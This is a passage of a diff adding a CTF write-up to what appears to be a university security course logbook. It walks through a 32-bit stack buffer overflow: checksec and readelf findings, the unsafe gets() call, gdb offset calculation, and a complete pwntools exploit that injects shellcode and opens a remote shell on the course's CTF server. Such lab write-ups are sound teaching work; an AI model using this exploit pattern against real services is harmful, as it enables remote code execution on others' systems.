@@ -374,3 +374,133 @@ As we can see, Bobby's password has been changed.
 
 ## CTF - Challenge 2
 
+In this challenge, we are given a `program`, along with its source code.
+
+### Step 1 - Checksec
+
+By running `checksec` on the program, we can discover many things:
+
+```bash
+❯ checksec program
+   Arch:     i386-32-little
+   RELRO:    No RELRO
+   Stack:    No canary found
+   NX:       NX disabled
+   PIE:      PIE enabled
+   RWX:      Has RWX segments   
+```
+
+- The executable's architecture is 32 bits and little-endian
+
+- There are segments in memory with Read, Write and Execute Permissions
+
+- Position Independent Executable (PIE) is enabled
+
+- NX (No eXecute) is disabled
+
+- There's no canary
+
+<br>
+
+Analyzing the program with `readelf -l program` gives us the following output:
+
+```bash
+Elf file type is DYN (Position-Independent Executable file)
+Entry point 0x10f0
+There are 11 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  # ...
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
+  # ...
+```
+
+As we can see, the stack has read (R), write (W) and execute (E) permissions. Knowing this and knowing that there is no stack canary, a return-oriented programming attack probably will be our most successful bet to get the flag. All that is left is for us to get a buffer overflow.
+
+
+### Step 2 - Source code analysis
+
+By analyzing the program's source code, as expected, we can immediately spot a buffer overflow vulnerability on line 12.
+
+```c
+int main() {
+   char buffer[100]; // line 5
+   
+   // ...
+
+   gets(buffer); // line 12
+
+   return 0;
+}
+```
+
+Since the program is using `gets`, it will continue reading the program's input into the `buffer` until it finds a null-byte terminator, even if it overflows the buffer's allocated space.
+
+This means that we can overwrite anything we want on the stack, as long as we know its relative position to the `buffer` in the stack.
+
+Furthermore, in the previous step, we determined that the stack has RWX permissions, which means that we can write a shellcode to the stack and then return to the address of the shellcode (the address of `buffer` is printed to the stdout on every execution), giving us a shell in the machine.
+
+### Step 3 - Return address offset
+
+The only thing that is left for us to write the exploit is to know the location of `main`'s return address relative to the `buffer` (offset). For that purpose, we will use `gdb`.
+
+![Debugging program](/images/logbook8/ctf2/1.png)
+![The addresses of ebp and buffer](/images/logbook8/ctf2/2.png)
+
+We can conclude that, in this execution, the value of `$ebp` is `0xffffc978` and the address of buffer is `0xffffc910`.
+
+```
+0xffffc978 - 0xffffc910 = 0x68 = 104
+```
+
+This means that we will need to write 104 bytes to overwrite the position pointed to by `ebp`, however, the return address, which is what we want to overwrite, is 1 position above the frame pointer, therefore:
+
+```
+OFFSET = 104 + 4 (32-bit frame pointer) = 108
+```
+
+### Step 3 - Exploitation
+
+Our exploit is as follows:
+
+```py
+#!/bin/env python3
+
+from pwn import *
+
+OFFSET = 108
+RET_ADDR_SIZE = 4
+
+p = remote("ctf-fsi.fe.up.pt", 4001)
+
+p.recvuntil([b" is "])
+
+address = p.recvline(keepends=False)[:-1]
+address = int(address, 16)
+
+info("Address: " + hex(address))
+
+# PAYLOAD
+
+payload = bytearray(0x90 for i in range(OFFSET + RET_ADDR_SIZE))
+shellcode = asm(shellcraft.i386.linux.sh())
+
+info("Shellcode size: " + str(len(shellcode)))
+
+payload[:len(shellcode)] = shellcode
+payload[OFFSET:OFFSET + RET_ADDR_SIZE] = p32(address)
+
+# END OF PAYLOAD
+
+p.sendlineafter(b":", payload)
+p.interactive()
+```
+
+1. Create a new process
+2. Read `buffer`'s address
+3. Create the payload, which consists of a shellcode at the start and the address of `buffer` at the end
+4. Send the payload to the process
+5. You have a shell!
+
+![Getting the flag](/images/logbook8/ctf2/3.png)
